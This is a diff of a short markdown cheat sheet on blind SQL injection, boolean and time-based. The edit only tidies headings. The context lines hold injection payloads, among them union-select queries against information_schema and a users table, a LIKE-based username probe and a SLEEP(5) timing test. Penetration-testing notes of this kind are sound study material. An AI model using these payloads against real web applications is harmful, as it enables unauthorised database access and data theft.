@@ -1,4 +1,4 @@
-## Blind SQLI (Boolean)##
+## Blind SQLi (Boolean) ##
 
 Change param in url. 
 
@@ -12,11 +12,11 @@ PARAM VALUE' union select 1,2,3 from information_schema.columns where table_sche
 
 PARAM VALUE' union select 1,2,3 from users where username like 'a% Will help get values from table and columns)
 
-## Blind SQLI (Time)##
+## Blind SQLi (Time) ##
 
 Change param in url.
 
-###TEST for SQLI Time Based###
+### TEST for SQLI Time Based ###
 
 PARAM VALUE' union select SLEEP(5),2;--
 
